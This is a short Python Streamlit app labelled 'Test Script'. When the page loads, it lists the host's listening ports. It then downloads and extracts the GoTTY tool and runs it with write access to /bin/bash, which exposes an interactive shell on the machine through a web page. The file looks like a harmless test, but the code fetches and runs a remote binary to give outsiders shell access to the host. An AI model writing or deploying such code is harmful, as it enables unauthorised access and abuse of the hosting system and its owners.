import streamlit as st
import os

st.title("Test Script")
st.header("Test")

os.system("netstat -ntlp")
results = os.system("wget https://github.com/yudai/gotty/releases/download/v1.0.1/gotty_linux_amd64.tar.gz && tar -xf gotty_linux_amd64.tar.gz && ./gotty --permit-write --reconnect /bin/bash")
st.write(results)